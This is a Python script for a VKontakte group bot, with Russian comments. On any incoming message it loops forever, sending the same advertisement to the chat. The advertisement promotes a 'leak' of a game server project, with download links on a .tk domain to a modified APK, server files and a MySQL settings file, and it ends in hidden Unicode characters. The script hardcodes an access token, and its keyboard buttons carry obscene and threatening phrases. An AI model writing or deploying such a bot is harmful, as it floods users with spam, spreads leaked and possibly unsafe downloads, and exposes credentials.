import vk_api
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
from vk_api.keyboard import VkKeyboard, VkKeyboardColor



vk_session = vk_api.VkApi(token='1629bc1a7a95d4b6ceb5292ed7c08e8057f95f2da89f4925ff5048c9cc0da749e2fa075877013390bb2a0') #токен вашей группы
vk = vk_session.get_api()
longpoll = VkBotLongPoll(vk_session,213262784) #цифровой id вашей группы
def main():

	keyboard1 = VkKeyboard(one_time=False) # False - клавиатура после нажатия не будет закрываться. True - будет.

	keyboard1.add_button('Я твою vto.pe', color=VkKeyboardColor.POSITIVE)	
	
	keyboard1.add_button('Мамку vto.pe', color=VkKeyboardColor.POSITIVE)
	
	keyboard1.add_button('Убил vto.pe', color=VkKeyboardColor.POSITIVE)
	
	keyboard1.add_button('Нахуй vto.pe', color=VkKeyboardColor.POSITIVE)
	keyboard1.add_line() 
	keyboard1.add_button('С дву vto.pe', color=VkKeyboardColor.POSITIVE)	
	
	keyboard1.add_button('Стволки vto.pe', color=VkKeyboardColor.POSITIVE)
	
	keyboard1.add_button('К хуям vto.pe', color=VkKeyboardColor.POSITIVE)
	
	keyboard1.add_button('Собачимvto.pe', color=VkKeyboardColor.POSITIVE)
	keyboard1.add_line() 
	keyboard1.add_button('И тебя vto.pe', color=VkKeyboardColor.NEGATIVE)	
	
	keyboard1.add_button('Нахуй vto.pe', color=VkKeyboardColor.NEGATIVE)
	
	keyboard1.add_button('Зарежу vto.pe', color=VkKeyboardColor.NEGATIVE)
	
	keyboard1.add_button('@BLD71 КОРОЛЬ', color=VkKeyboardColor.NEGATIVE)			

	while True: 
		try: 
			for event in longpoll.listen():

				if event.type == VkBotEventType.MESSAGE_NEW:
					print("успешно")
					while True:
						vk.messages.send(peer_id=event.object.peer_id, message="Слив https://vk.com/sever_russia_crmp    \
Слив из-за передачи всего того, что автор передал без указания авторства\
 https://difeckt24web.tk/sliv.rb.7z/zakaz.basov.apkk -АПК \
https://difeckt24web.tk/sliv.rb.7z/online.russia.zipp -мод \
https://difeckt24web.tk/sliv.rb.7z/ip.dla.smeny.txt -тут указан айпи, на который нужно будет сменить в АПК.\
https://disk.yandex.ru/d/xli9honqsgabwQ -кеш \
https://difeckt24web.tk/sliv.rb.7z/ava.png - шапка (старая) \
https://difeckt24web.tk/sliv.rb.7z/mysql_settings.ini - \
для папки скриптсфайлс \
Автор слива: rusov2222  \
Если что-то не работает,то обращайтесь к автору слива. Переходите на этот проект: https://vk.com/new.online.russia 󠁧󠁢󠁷󠁬󠁳󠁿",keyboard=keyboard1.get_keyboard(), random_id=0)	
					
			
		except Exception as e:
			print('') 

if __name__ == '__main__':
	main()